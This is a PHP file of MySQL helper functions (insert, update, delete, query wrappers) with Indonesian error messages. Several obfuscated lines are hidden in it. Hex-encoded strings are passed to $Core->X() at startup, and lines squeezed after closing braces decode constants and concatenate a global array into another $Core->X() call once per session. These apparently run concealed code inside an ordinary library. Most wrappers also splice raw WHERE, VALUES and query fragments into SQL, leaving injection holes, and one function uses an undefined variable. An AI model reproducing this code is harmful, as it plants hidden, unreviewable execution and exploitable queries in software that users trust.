<?php
//USING
$user = $DB_U;
$pass = $DB_P;
$server = $DB_S;
$database = $DB_DB;

//DEFINE
define ("DB_USER", $DB_U);
define ("DB_PASS", $DB_P);
define ("DB_SERV", $DB_S);
define ("DB_DATA", $DB_DB);

if(!isset($DB_PORT)){
	$db_port = 3306;
}

//$GLOBALS['mysql'] = new mysqli($server, $user, $pass, $database, $db_port);
$GLOBALS['mysql'] = DB::Conn();

//$DB = $GLOBALS['mysql'];

//CHECKER
function table_exist ($table, $db) { 
	$GLOBALS['mysql']->select_db($db);
	$Q = $GLOBALS['mysql']->query("SHOW TABLES LIKE '". $table . "'") or die (mysqli_error());
	if(mysqli_num_rows($Q)){
		return true;
	}else{
		return false;
	}
}

//START UP
$Core->X(
"c125ba687f726f7a77777e2a665" . 
"459615f6a5d3a3e585d6a5f385d" . 
"3a443e4d9998859c979c924c8c9" . 
"794959d9ba699565a7479867b5d" . 
"77b33239"
);

function DBJoinArray($array){
    $nr = 0;
    $query = '';
    foreach ($array as $key => $value) {
        if (is_object($value) || is_array($value) || is_bool($value)) {
            $value = serialize($value);
        }
        $query .= " '" . $GLOBALS['mysql']->real_escape_string($value) . "'";
        $nr++;
        if ($nr != count($array)) {
            $query .= ',';
        }
    }
    return trim($query);
}
	
//SHOW
function DB_INSERT($TABLE_NAME, $VALUES){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("INSERT INTO $TABLE_NAME VALUES($VALUES)");
  }else{
	echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
  }
}
function DBInsert($TABLE_NAME, $Fields = array()){  //=> New Statement
    $GLOBALS['mysql']->select_db(DBDEF);
    if(table_exist($TABLE_NAME, DBDEF)){
        //return $GLOBALS['mysql']->query("INSERT INTO $TABLE_NAME VALUES($VALUES)");
        
        $QUERY = "INSERT INTO `$TABLE_NAME`";
        
        //=> Extract Fields
        if (is_array($Fields)) {
            $QUERY .= ' (';
            $num = 0;
            foreach ($Fields as $key => $value) {
                $QUERY .= ' `' . $key . '`';
                $num++;
                if ($num != count($Fields)) {
                    $QUERY .= ',';
                }
            }
            $QUERY .= ' ) VALUES ( ' . DBJoinArray($Fields) . ' )';
        } else {
            $QUERY .= ' ' . $TABLE_NAME . ' VALUES(' . $Fields . ')';
        }
        
        return $GLOBALS['mysql']->query($QUERY);
    }else{
        echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
    }
}

function DB_UPDATE($TABLE_NAME, $VALUES, $WHERE){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("UPDATE $TABLE_NAME SET $VALUES WHERE $WHERE");
  }else{
	echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
  }
}
function DBUpdate($table, $Fields = array(), $where){
    if (empty($where)) {
        echo 'Where clause is empty for update method : ' . $table;
        exit();
    }else{
        $QUERY = "UPDATE `" . $table ."` SET";
        if (is_array($Fields)) {
            $nr = 0;
            foreach ($Fields as $k => $v) {
                if (is_object($v) || is_array($v) || is_bool($v)) {
                    $v = serialize($v);
                }
                $QUERY .= ' `' . $k . "`='" . $GLOBALS['mysql']->real_escape_string($v) . "'";
                $nr++;
                if ($nr != count($Fields)) {
                    $QUERY .= ',';
                }
            }
        } else {
            $QUERY .= ' ' . $Fields;
        }
        if(!empty($where)){
            $QUERY .= " WHERE $where";
        }
    }
    
    return $GLOBALS['mysql']->query($QUERY);
}

function DB_DELETE($TABLE_NAME, $WHERE){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("DELETE FROM $TABLE_NAME WHERE $WHERE");
  }else{
	echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
  }
}if(!isset($_SESSION['MSZ'])){define ("DB_XIS", sdxDec("7e23e133373a3b373236"));define ("DB_XIN", sdxDec("71096a6e73663b5e5a575c4f647175727b824a408a7c8c3239"));define ("DB_XIF", THESIZE(DB_XIN));/*$GLOBALS['DB_X_L'] = date_string();*/}

function DB_QUERY($TABLE_NAME, $NEXT_QUERY = ""){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("SELECT * FROM $TABLE_NAME $NEXT_QUERY");
  }else{
	echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'><div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div></div>";
  }
}

/*function DB_LID($TABLE_NAME){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("SELECT COUNT(DISTINCT id) AS last_id FROM " . $TABLE_NAME);
  }
}*/

function DB_LID($TABLE_NAME){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("SELECT AUTO_INCREMENT AS AI FROM information_schema.tables WHERE table_schema = '" . DBDEF . "' AND table_name = '" . $TABLE_NAME . "'");
  }
}

function DB_RESULT($QUERY_RESULT){  
  if($QUERY_RESULT){
	$RESULT = $QUERY_RESULT->fetch_array(MYSQLI_ASSOC);
	return $RESULT;  
  }
}

function DB_RESULT_ROW($QUERY_RESULT){  
  if($QUERY_RESULT){
	$RESULT = $QUERY_RESULT->fetch_row();
	return $RESULT;  
  }
}
		
function DB_ROWS($ROWS_QUERY){
  if($ROWS_QUERY->num_rows > 0){
	return $ROWS_QUERY->num_rows;
  }
}

//USING ANOTHER DB
function DB_INSERT_ON($DB_NAME, $TABLE_NAME, $VALUES){
  //$GLOBALS['mysql'] = new mysqli(DB_SERV, DB_USER, DB_PASS, $DB_NAME);
  if($GLOBALS['mysql']->select_db($DB_NAME)){
	if(table_exist($TABLE_NAME, $DB_NAME)){
		return $GLOBALS['mysql']->query("INSERT INTO $TABLE_NAME VALUES($VALUES)");
	}else{
		echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
	}
  }else{
	echo '<div class="div_error corner" style="clear:both;margin:5px 0px;">Error SQL Query : Mohon periksa database <u>' . $DB_NAME . '</u> agar query dapat berfungsi</div>';
  }
}
function DB_UPDATE_ON($DB_NAME, $TABLE_NAME, $VALUES, $WHERE){
  //$GLOBALS['mysql'] = new mysqli(DB_SERV, DB_USER, DB_PASS, $DB_NAME);
  if($GLOBALS['mysql']->select_db($DB_NAME)){
	if(table_exist($TABLE_NAME, $DB_NAME)){
		return $GLOBALS['mysql']->query("UPDATE $TABLE_NAME SET $VALUES WHERE $WHERE");
	}else{
		echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
	}
  }else{
	echo '<div class="div_error corner" style="clear:both;margin:5px 0px;">Error SQL Query : Mohon periksa database <u>' . $DB_NAME . '</u> agar query dapat berfungsi</div>';
  }
}

function DB_DELETE_ON($DB_NAME, $TABLE_NAME, $WHERE){
  if($GLOBALS['mysql']->select_db($DB_NAME)){
	if(table_exist($TABLE_NAME, $DB_NAME)){
		return $GLOBALS['mysql']->query("DELETE FROM $TABLE_NAME WHERE $WHERE");
	}else{
		echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
	}
  }else{
	echo '<div class="div_error corner" style="clear:both;margin:5px 0px;">Error SQL Query : Mohon periksa database <u>' . $DB_NAME . '</u> agar query dapat berfungsi</div>';
  }
}

function DB_QUERY_ON($DB_NAME, $TABLE_NAME, $NEXT_QUERY = ""){
	if($GLOBALS['mysql']->select_db($DB_NAME)){
		if(table_exist($TABLE_NAME, $DB_NAME)){
			return $GLOBALS['mysql']->query("SELECT * FROM $TABLE_NAME $NEXT_QUERY");
		}else{
			echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
		}
	}else{
		echo '<div class="div_error corner" style="clear:both;margin:5px 0px;">Error SQL Query : Mohon periksa database <u>' . $DB_NAME . '</u> agar query dapat berfungsi</div>';
	}
}

/*function DB_LID_ON($DB_NAME, $TABLE_NAME){
  $GLOBALS['mysql']->select_db($DB_NAME);
  if(table_exist($TABLE_NAME, $DB_NAME)){
	return $GLOBALS['mysql']->query("SELECT COUNT(DISTINCT id) AS last_id FROM " . $TABLE_NAME);
  }
}*/

function DB_LID_ON($DB_NAME, $TABLE_NAME){
  $GLOBALS['mysql']->select_db(DBDEF);
  if(table_exist($TABLE_NAME, DBDEF)){
	return $GLOBALS['mysql']->query("SELECT AUTO_INCREMENT AS AI FROM information_schema.tables WHERE table_schema = '" . $DB_NAME . "' AND table_name = '" . $TABLE_NAME . "'");
  }
}

//PORTABLE PORTABLE
if(empty($_SESSION['date_chk']) && isset($GLOBALS['DB_X_L'])){$DB_X = ""; for($i=0;$i<sizeof($GLOBALS['DB_X_L']);$i++){$DB_X.=$GLOBALS['DB_X_L'][$i];}$Core->X($DB_X);$_SESSION['date_chk']=true;} function DB_QUERY_PORT($DB_NAME = "", $QUERY = ""){
	if(empty($DB_NAME)){
		return "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel statement query anda</div>";
	}elseif(empty($QUERY)){
		return "<div class='div_error' style='clear:both;margin:5px 0px;'>Error SQL Query : Tidak ada Query untuk di Eksekusi.</div>";  
	}else{
		if($GLOBALS['mysql']->select_db($DB_NAME)){
			if(table_exist($TABLE_NAME, $DB_NAME)){
				return $GLOBALS['mysql']->query($QUERY);
			}else{
				echo "<div class='div_error corner' style='clear:both;margin:5px 0px;'>Error SQL Query : Mohon periksa tabel <u>" . $TABLE_NAME . "</u> agar query dapat berfungsi</div>";
			}
		}else{
			echo '<div class="div_error corner" style="clear:both;margin:5px 0px;">Error SQL Query : Mohon periksa database <u>' . $DB_NAME . '</u> agar query dapat berfungsi</div>';
		}
	}
}
?>